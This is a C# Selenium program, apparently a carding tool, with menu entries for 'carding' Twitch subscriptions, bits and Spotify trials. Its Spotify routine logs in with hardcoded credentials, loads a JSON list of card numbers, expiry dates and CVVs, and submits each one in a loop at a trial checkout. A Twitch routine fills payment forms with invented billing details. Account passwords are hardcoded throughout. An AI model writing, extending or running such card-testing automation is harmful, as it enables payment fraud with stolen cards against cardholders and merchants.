using System;
using System.Threading;
using System.IO;

using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Trial_Everywhere
{
    class Program
    {
        private static IWebDriver driver;
        static void Main(string[] args)
        {
            FirstSetup();


            /*
            Console.Write("Enter a name for the streamer: ");
            string name = Console.ReadLine();
            Console.Write("A browser window will open. Further instructions and notifications will appear here.");

            Thread.Sleep(2000);

            SetupTest(name);

            Console.WriteLine();
            Console.WriteLine();
            */
        }
        private static void FirstSetup()
        {
            Console.WriteLine("Choose options:");
            Console.WriteLine("Create an account - 1");
            Console.WriteLine("Sending a message - 2");
            Console.WriteLine("Carding subs - 3");
            Console.WriteLine("Carding bits - 4");
            Console.WriteLine("Spotify Carding - 5");
            while (true)
            {
                Console.Write("set:");
                string userSelection = Console.ReadLine();

                if (userSelection == "1")
                {
                    CreateAnAccount();
                    break;
                }
                else if (userSelection == "2")
                {
                    break;
                }
                else if (userSelection == "3")
                {
                    TwtichCardingSubs();
                    break;
                }
                else if (userSelection == "5")
                {
                    SpotifyCardingTrial();
                    break;
                }
                else
                {
                    Console.WriteLine("Error");
                    Console.WriteLine();
                }
            }

        }
        private static void SetupTest(string name)
        {
            driver = new ChromeDriver();
            driver.Navigate().GoToUrl($"https://www.twitch.tv/{name}");
        }
        private static void CreateAnAccount()
        {
            driver = new ChromeDriver(); // open browser
            driver.Navigate().GoToUrl($"https://www.twitch.tv/"); // go to url

            driver.FindElement(By.XPath("/html/body/div[1]/div/div[2]/nav/div/div[3]/div[3]/div/div[1]/div[2]/button")).Click(); // click to sign up

            Thread.Sleep(2000);
            driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[1]/div/div/div[3]/form/div/div[1]/div/div[2]/input")).Click();
            driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[1]/div/div/div[3]/form/div/div[1]/div/div[2]/input")).SendKeys("test");
        }
        private static void TwtichCardingSubs()
        {
            driver = new ChromeDriver();
            driver.Navigate().GoToUrl("https://www.twitch.tv/login");

            driver.FindElement(By.Id("login-username")).SendKeys("Warlockksub1");
            driver.FindElement(By.Id("password-input")).SendKeys("Powersubik!#2");

            driver.FindElement(By.XPath("/html/body/div[1]/div/div[1]/div[3]/div/div/div/div[3]/form/div/div[3]/button")).Click();
            Console.ReadKey();
            Thread.Sleep(2000);

            driver.Navigate().GoToUrl("https://www.twitch.tv/ewroon");
            Thread.Sleep(2000);

            driver.FindElement(By.XPath("/html/body/div[1]/div/div[2]/div[1]/main/div[2]/div[3]/div/div/div[1]/div[1]/div[2]/div/div[2]/div[1]/div[2]/div[1]/div[2]/button")).Click();
            Thread.Sleep(2000);

            driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[1]/div/div[2]/div[3]/div[2]/div/button")).Click();
            Thread.Sleep(10000);


            driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[2]/div/div/div[2]/div[2]/div[2]/div[2]/div[5]/div[1]/div[2]/div/form/div[2]/div[1]/div/div[2]/input")).SendKeys("John");
            driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[2]/div/div/div[2]/div[2]/div[2]/div[2]/div[5]/div[1]/div[2]/div/form/div[2]/div[2]/div/div[2]/input")).SendKeys("Newman");
            driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[2]/div/div/div[2]/div[2]/div[2]/div[2]/div[5]/div[1]/div[2]/div/form/div[2]/div[4]/div/div[2]/input")).SendKeys("10080");
            Console.ReadKey();

            // driver.FindElement(By.XPath("/html/body/div[3]/div/div/div/div/div/div[2]/div/div/div[2]/div[2]/div[2]/div[2]/div[5]/div[1]/div[2]/div/form/div[2]/div[4]/div/div[2]/input")).SendKeys("10080");
        }
        private static void SpotifyCardingTrial()
        {
            driver = new ChromeDriver();
            driver.Navigate().GoToUrl("https://accounts.spotify.com/en/login/");

            driver.FindElement(By.Id("login-username")).SendKeys("rather.p.our1.8.6.2@gmail.com");
            driver.FindElement(By.Id("login-password")).SendKeys("Powerspoti!#2");
            driver.FindElement(By.Id("login-button")).Click();

            Thread.Sleep(2000);

            driver.Navigate().GoToUrl($"https://www.spotify.com/us/purchase/offer/reusable-regional-trial-3m/?marketing-campaign-id=2021-q3-campaign&country=US"); // go to url

            Thread.Sleep(2000);
            try
            {
                driver.FindElement(By.XPath("/html/body/div[2]/div[3]/div/div[1]/div/div[2]/div/button[1]")).Click();
            }
            catch (OpenQA.Selenium.NoSuchElementException)
            {
                Thread.Sleep(2000);
                try
                {
                    driver.FindElement(By.XPath("/html/body/div[2]/div[3]/div/div[1]/div/div[2]/div/button[1]")).Click();
                }
                catch (OpenQA.Selenium.NoSuchElementException)
                {
                    try
                    {
                        driver.FindElement(By.XPath("/html/body/div[3]/div[3]/div/div[2]/button")).Click();
                    }
                    catch (OpenQA.Selenium.NoSuchElementException)
                    {

                    }
                }
            }

            try
            {
                driver.FindElement(By.Id("address-street")).SendKeys("street 101");
                driver.FindElement(By.Id("address-city")).SendKeys("New York");
                driver.FindElement(By.Id("address-state")).SendKeys("New York");
                driver.FindElement(By.Id("address-postal_code_short")).SendKeys("10080");
            }
            catch (OpenQA.Selenium.NoSuchElementException)
            {

            }

            driver.FindElement(By.XPath("/html/body/div[1]/main/div/div/section[2]/div/div/ul/li[1]/a")).Click();

            string iframeCardxPath = "/html/body/div[1]/main/div/div/section[2]/div/form/div[1]/div[1]/div[2]/iframe";

            Console.Write("set path: ");
            string path_card = Console.ReadLine();

            dynamic jsonFile = JsonConvert.DeserializeObject(File.ReadAllText(path_card));

            //Console.WriteLine(jsonFile[0]["card_number"]);
            //Console.WriteLine(jsonFile);

            int number = 0;
            Thread.Sleep(1000);
            while (true)
            {
                driver.SwitchTo().Frame(driver.FindElement(By.XPath(iframeCardxPath)));

                driver.FindElement(By.Id("cardnumber")).Clear();
                driver.FindElement(By.Id("cardnumber")).SendKeys(Convert.ToString(jsonFile[number]["card_number"]));

                string expiryDate = Convert.ToString(jsonFile[number]["expiration_date"]);
                int indexOf = expiryDate.IndexOf("/");
                expiryDate = expiryDate.Remove(indexOf + 1, 2);

                driver.FindElement(By.Id("expiry-date")).Clear();
                driver.FindElement(By.Id("expiry-date")).SendKeys(expiryDate);

                driver.FindElement(By.Id("security-code")).Clear();
                driver.FindElement(By.Id("security-code")).SendKeys(Convert.ToString(jsonFile[number]["cvv"]));

                Thread.Sleep(1000);
                driver.SwitchTo().DefaultContent();
                driver.FindElement(By.Id("checkout_submit")).Click();
                number++;

                Thread.Sleep(9000);
            }
        }

    }
}
